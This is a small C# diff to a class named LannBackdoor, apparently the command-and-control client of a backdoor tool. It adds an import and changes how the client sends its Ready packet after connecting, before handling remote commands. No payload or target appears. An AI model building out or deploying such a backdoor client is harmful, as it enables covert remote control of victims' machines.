@@ -3,6 +3,7 @@ using LannUtils;
 using ModulesApi;
 using Networking;
 using Networking.Packets;
+using Networking.Structures;
 using Serilog.Core;
 using SystemModule;
 using Constants = LannConstants.Constants;
@@ -36,7 +37,7 @@ public static class LannBackdoor {
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
             await _tcpClient.StartHandlingPackets();
-            await _tcpClient.SendPacket(PacketType.Ready, new { });
+            await _tcpClient.SendPacket(new ClientPacket { Type = PacketType.Ready });
         };
 
         _tcpClient.OnCommand += async (_, data) => {
